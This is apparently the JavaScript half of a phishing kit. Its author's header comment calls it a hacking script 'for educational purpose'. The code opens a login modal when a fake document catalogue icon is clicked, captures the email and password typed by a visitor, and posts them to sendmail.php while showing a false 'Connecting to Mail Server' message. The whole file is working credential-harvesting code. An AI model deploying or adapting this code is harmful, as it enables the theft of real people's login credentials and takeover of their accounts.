/*
  SCRIPT WRITTEN BY NEDUNES QUADRILLIONZ
  DATE : 19th APRIL 2018
  TIME: 10:59 PM

  PLEASE USE AT YOUR OWN RISK
  HACKING IS ILLEGAL AND IF CAUGHT WILL FACE THE CONSEQUENECIES OF THE LAW
  FOR EDUCATIONAL PURPOSE

  THIS SCRIPTS JUST GRABS THE FORM DETAILS DYNAMICALLY AS THE USER TYPES ON HIS/HER KEYBOARD
  WITH THE HELP OF JQUERY LIBRARY.

*/
$(document).ready(function() {

  //Adding a modal trigger to the word doc icon on click
  $("#view-catalogue").click(function(){
        $("#myModal").modal();
    });


    //Watching out for submit event
    $('#view-btn').click(function(){


      //Email validation

      function IsValidEmail(email) {
         var expr = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
         return expr.test(email);
     }



      var email = $('#email').val();
      var pwd = $('#pwd').val();






          if (email == 'email' || pwd == 'pwd')
           {
              //If the two fields are empty

              if (email == 'email') {
                  $('#emailerror').html('Please Insert reciever\'s email address');
                  $('#response').html('');
                  return false;
              }else{
                  $('#pwderror').html('Please Insert password');
                  $('#response').html('');
                    return false;
              }


           }else{

              //When all values are available
              if(!IsValidEmail(email)){
                $('#emailerror').html('Invalid email Address');
                return false;
              }else{

                  //Clear irrelevant notifications
                    $('#emailerror').html('');
                    $('#pwderror').html('');
                    $('#response').html('');

                //Make the Ajax REQUEST_METHOD

                  $.ajax({
                     url:"sendmail.php",
                     method:"POST",
                     data:{email:email, pwd:pwd},
                     beforeSend:function(){
                        $('#response').html('');
                         $('#view-btn').html('Connecting...');
                         $('#response').fadeIn().html('<div class="alert alert-success " >Connecting to Mail Server....</div>');
                     },
                     success:function(data){
                          $("form").trigger("reset");
                          $('#response').fadeIn().html(data);

                     },

                    complete:function(){
                       $('#view-btn').html('View');
                    }
                });


              }

           }




    });

    return false;


});
